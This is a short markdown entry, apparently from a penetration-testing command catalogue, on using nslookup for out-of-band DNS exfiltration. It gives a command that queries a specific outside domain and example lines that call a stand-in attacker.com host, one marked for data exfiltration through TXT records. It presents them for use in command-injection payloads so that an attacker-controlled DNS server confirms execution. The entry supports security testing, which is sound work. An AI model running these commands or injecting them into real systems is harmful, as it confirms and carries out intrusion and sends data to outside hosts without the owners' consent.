---
data: nslookup "dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh".86m.r87.me
tags:
  - oob
  - dns
  - exfiltration
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:38.992Z'
id: eaaf4a84-d6ce-46fe-b8cc-4216b4b26236
verified: false
validated: true
submitted: true
---
# Nslookup OOB DNS Exfiltration

## Command

```bash
nslookup "dqzr3elx6wgztgtzd3if-0oyyf_qzd2wodwlaljh".86m.r87.me
```

## Description

Performs a DNS lookup to an attacker-controlled subdomain, used in payloads for out-of-band detection of command injection execution.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| hostname | Attacker subdomain for query | Yes |

## Examples

### Basic Usage

```bash
nslookup "uniqueid".attacker.com
```

### Advanced Usage

```bash
nslookup -type=TXT "dataexfil".attacker.com # For data exfiltration via TXT records
```

## Expected Output

DNS query sent to attacker's server, confirming execution via query log.

## Related

- [[commands/test-xss-payload]]
